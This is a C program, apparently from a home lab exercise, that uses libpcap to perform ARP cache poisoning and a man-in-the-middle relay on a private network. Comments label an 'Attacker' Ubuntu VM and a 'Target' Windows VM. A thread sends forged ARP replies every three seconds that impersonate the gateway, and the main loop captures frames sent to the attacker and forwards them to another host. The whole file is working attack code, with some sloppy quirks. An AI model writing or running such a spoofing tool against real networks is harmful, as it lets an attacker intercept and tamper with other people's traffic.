//BASIC RECOVERY TIME
//$cat /proc/sys/net/ipv4/neigh/default/gc_stale_time

// ens33 192.168.246.136 192.168.246.2
// Ubuntu 192.168.246.147 00:0c:29:2e:16:e4
// XP 192.168.246.136 00:0c:29:9e:41:49
// Win10 

#include <stdio.h>
#include <pcap.h>            // PCAP
#include <stdlib.h>
#include <netinet/ether.h>     // for either_ntoa
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <string.h>
#include <pthread.h>           // THREAD
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netdb.h>
#include <ifaddrs.h>
#include <unistd.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/tcp.h>



#define SIZE_ETHER 14
#define ETH_ALEN 6

void _send_arp(u_char *dev_str,u_char *dst_mac,u_char *src_mac,u_char *sender_mac,u_char *sender_ip,u_char *target_mac,u_char *target_ip,u_short _opcode){
	static u_char s_arp[43]={               
		/* 						ETHER PACKET    				       			 */
		0xff,0xff,0xff,0xff,0xff,0xff,   /*Destination Mac : Target(VM_win10)    */ 
		0x00,0x0c,0x29,0x2e,0x16,0xe4,   /*Source Mac      : Attacker(VM_Ubuntu) */
		0x08, 0x06,				         /*Ether Type                			 */
		/*				  	   NOW ARP PACKET  									 */
		0x00, 0x01,						 /*Hardware Type 						 */
		0x08, 0x00,						 /*Protocol Type 						 */
		0x06,					         /*Hardware Size, Length      			 */ 
		0x04,					         /*Protocol Size			  			 */
/*20*/	0x00,0x02,				         /*Opcode, 2 is replay        			 */
		0x00,0x0c,0x29,0x2e,0x16,0xe4,   /*Sender MAC      : Attacker(VM_Ubuntu) */
		0xc0,0xa8,0xf6,0x02,		     /*Sender IP (GW IP)		 			 */
		0x00,0x00,0x00,0x00,0x00,0x00,   /*Target MAC      : Target(VM_win10)    */
		0xc0,0xa8,0xf6,0x87				 /*Tartget IP      : Target              */
	};

	
	for(int i=0; i<6; i++){
		s_arp[i]=dst_mac[i];
		s_arp[i+6]=src_mac[i];
		s_arp[i+22]=sender_mac[i];
		s_arp[i+28]=sender_ip[i];
		s_arp[i+32]=target_mac[i];
		s_arp[i+38]=target_ip[i];
	} s_arp[33]=target_mac[1];  //  i can't understand here. but if didn't do this.  something going wrong
/*
	printf("[func] ARP packet: ");
	for(int i=0; i<42; i++){   // it's ARP packet,  size=42
		if(i%16==0) printf("\n");
		printf("[%02x]",s_arp[i]);
	} printf("\n");
*/

	pcap_t *s_handle;
	u_char *s_packet;
	struct pcap_pkthdr *header;
	char *dev;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct bpf_program fp;

	int count=0;
	setbuf(stdout,NULL);

	dev = pcap_lookupdev(errbuf);
	if (dev == NULL) { fprintf(stderr, "Couldn't find default device: %s\n", errbuf); return(2); }
	s_handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (s_handle == NULL) { fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf); return(2); }
	
	
	int t=0;
	pcap_sendpacket(s_handle, s_arp, 43);
}

u_char* _ip_string_to_bytes(u_char *ip_str){
	static u_char _ip[4];
	const char tk[2] = ".";	
	char *token;

	int i=0;
	token = strtok(ip_str, tk);
	while( token != NULL ) 
	{
	  _ip[i++]=atoi(token);
	  token = strtok(NULL, tk);
	}
/*
	printf("IP: ");
	for(int i=0; i<4; i++){
		printf("%d",_ip[i]);
		if(i<3) printf(".");
	} printf("\n");
	*/
	return  _ip;
}
u_char* _get_mac_from_table2(u_char *target_ip){
	u_char *map_table[8]={"192.168.246.2","00:50:56:ea:64:b3",
	    				"192.168.246.145","00:0c:29:ff:61:71",
						"192.168.246.254","00:50:56:e6:ed:9a",
						"192.168.246.136","00:0c:29:9e:41:49" };

	u_char pair_mac1_str[80];
	static u_char pair_mac1_bytes[80];
	
	printf("====mac of target_ip====\n");
	for(int i=0; i<8; i+=2){
		if(strcmp(target_ip,map_table[i])==0){
			strcpy(pair_mac1_str,map_table[i+1]);
			break;
		}
		else{
			//printf("need to update hard map table\n");
		}
	}

	const u_char s2[2]=":";
	u_char *token2;

	token2=strtok(pair_mac1_str,s2);                
	int k=0;
	while( token2 != NULL ) 
	{
	  pair_mac1_bytes[k]=strtol(token2,NULL,16);
	  k++;
	  //printf("token2: %s\n",token2);
	  token2 = strtok(NULL, s2);
	}
/*
	printf("[func] dst ip: %s\n",target_ip);
    printf("[func] target_mac: ");
    for(int i=0; i<6; i++){
        printf("[%02x]",pair_mac1_bytes[i]);
    } printf(" bytes\n");
*/
	return pair_mac1_bytes;
}
u_char* _get_mac_from_table(u_char *target_ip){
	u_char *map_table[8]={"192.168.246.2","00:50:56:ea:64:b3",
	    				"192.168.246.145","00:0c:29:ff:61:71",
						"192.168.246.254","00:50:56:e6:ed:9a",
						"192.168.246.136","00:0c:29:9e:41:49" };

	u_char pair_mac1_str[80];
	static u_char pair_mac1_bytes[80];
	
	//printf("====mac of target_ip====\n");
	for(int i=0; i<8; i+=2){
		if(strcmp(target_ip,map_table[i])==0){
			strcpy(pair_mac1_str,map_table[i+1]);
			break;
		}
		else{
			//printf("need to update hard map table\n");
		}
	}

	const u_char s2[2]=":";
	u_char *token2;

	token2=strtok(pair_mac1_str,s2);                
	int k=0;
	while( token2 != NULL ) 
	{
	  pair_mac1_bytes[k]=strtol(token2,NULL,16);
	  k++;
	  //printf("token2: %s\n",token2);
	  token2 = strtok(NULL, s2);
	}
	/*
	printf("[func] dst ip: %s\n",target_ip);
    printf("[func] target_mac: ");
    for(int i=0; i<6; i++){
        printf("[%02x]",pair_mac1_bytes[i]);
    } printf(" bytes\n");
	*/
	return pair_mac1_bytes;
}
u_char* _get_mymac(u_char *dev_str){
    static u_char _mymac[6];
    int _s;
    struct ifreq ifr;
    _s = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, dev_str);
    ioctl(_s, SIOCGIFHWADDR, &ifr);
    
    for(int i=0; i<6; i++){
        _mymac[i]=((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
        //printf("(%02x)",_mymac[i]);
    } 
    return _mymac;
}
u_char* _get_myip(u_char *dev_str){
	struct ifaddrs *ifaddr, *ifa;
    int family, s;
    char host[NI_MAXHOST];  // defined  NI_MAXHOST==1025
    
    if (getifaddrs(&ifaddr) == -1) 
    {
        perror("getifaddrs");
        return -1;
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) 
    {
        if (ifa->ifa_addr == NULL)
            continue;  

        s=getnameinfo(ifa->ifa_addr,sizeof(struct sockaddr_in),host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);

        if((strcmp(ifa->ifa_name,dev_str)==0)&&(ifa->ifa_addr->sa_family==AF_INET))
        {
            if (s != 0)
            {
                printf("getnameinfo() failed: %s\n", gai_strerror(s));
                return -1;
            }
            //printf("\nInterface : <%s>\n",ifa->ifa_name );
            //printf("Address : <%s>\n", host); 
        }
    }

    freeifaddrs(ifaddr);
    return _ip_string_to_bytes(host);
}


//ARGUEMENTS
char dev_str[80];
static u_char ip_str1[80];
static u_char ip_str2[80];

void *thread_send_arp(void *threadid){
			int count_f=0;
			u_char *_mymac;
			_mymac=_get_mymac(dev_str);

		while(1){
			_send_arp(dev_str,_get_mac_from_table(ip_str1),_mymac,_mymac,_ip_string_to_bytes(ip_str2),_get_mac_from_table(ip_str1),_ip_string_to_bytes(ip_str1),0x0002);
			//printf("**[%d]**\n",++count_f);
			sleep(3);	
		}
}


int main(int argc, char *argv[]){
//---------------------------------------------------------
// taking argument
    strcpy(dev_str,argv[1]);
    strcpy(ip_str1,argv[2]);
    strcpy(ip_str2,argv[3]);
//---------------------------------------------------------
// my mac and ip
    u_char *_mymac=_get_mymac(dev_str);
    u_char *_myip=_get_myip(dev_str);

    printf("::mymac:: ");
    for(int i=0; i<6; i++){
    	printf("[%02x]",_mymac[i]);
    } printf("\n");
	printf("::myip:: ");
    for(int i=0; i<4; i++){
    	printf("%d",_myip[i]);
    	if(i<3) printf(".");
    } printf("\n");
//---------------------------------------------------------
	pcap_t *handle;		
	char errbuf[PCAP_ERRBUF_SIZE];	
	struct bpf_program fp;		
	struct pcap_pkthdr *header;
	int ck_packet;	
	u_char *packet;	
	struct ether_header *_eth;
	struct ip *_ip;
	struct icmphdr *_icmp;
	int count=0;

	u_char *_tmp_mac;
	u_char tmp_mac[6];
	_tmp_mac=_get_mac_from_table(ip_str1);
	/*
	printf("check: ");
	for(int i=0; i<6; i++){
		printf("[%02x]",_tmp_mac[i]);
	}
	*/
	handle = pcap_open_live(dev_str, BUFSIZ, 1, 3, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev_str, errbuf);
		return(2);
	}

//--Thread-------------------------------------------------
	pthread_t thread01;
	int rc;
	int id=0;

	pthread_create(&thread01,NULL,thread_send_arp,&id);



//--Capture------------------------------------------------
	while(1){
		ck_packet = pcap_next_ex(handle, &header,&packet);
		if(ck_packet==0){
			printf("ck_packet=0\n");
			continue;
		}
		else if(ck_packet==1){
			_eth=(struct ether_header*)(packet);
			_ip=(struct ip*)(&(packet[SIZE_ETHER]));			
			//_icmp=(struct icmphdr*)(&(packet[SIZE_ETHER+20]));

				//REPLY			
				u_char buf[100];
				struct ether_header *_eth_tmp=(struct ether_header*)buf;
				
				if((memcmp(_eth->ether_dhost,_mymac,6)==0)){
					printf("A to C\n");
					u_char *_dst_mac_tmp1;
					_dst_mac_tmp1=_get_mac_from_table(argv[3]);

				
					printf("argv[3]>%s\n",argv[3]);
					printf("mac of argv[3]: ");
					for(int i=0; i<6; i++){
						printf("[%02x]",_dst_mac_tmp1[i]);
					} printf("\n");
			
					memcpy(_eth->ether_dhost,_dst_mac_tmp1,6);
					//memcpy(_eth->ether_shost,_mymac,6);
			/*
					printf("overwirte DST MAC: ");
					for(int i=0; i<6; i++){
						printf("[%02x]",_eth->ether_dhost[i]);
					} printf("\n");
			*/
					printf("Packet: ");
					for(int i=0; i<74; i++){
						if(i%16==0) printf("\n");
						printf("[%02x]",packet[i]);
					} printf("\n");

					
					printf("*****************************ICMP**[%d]\n",++count);
					
					pcap_sendpacket(handle,packet,60+14);
				}
			
		}
		else{
			printf("ck_packout wrong\n");
			break;
		}	
	}
	pcap_close(handle);
	return(0);
 }
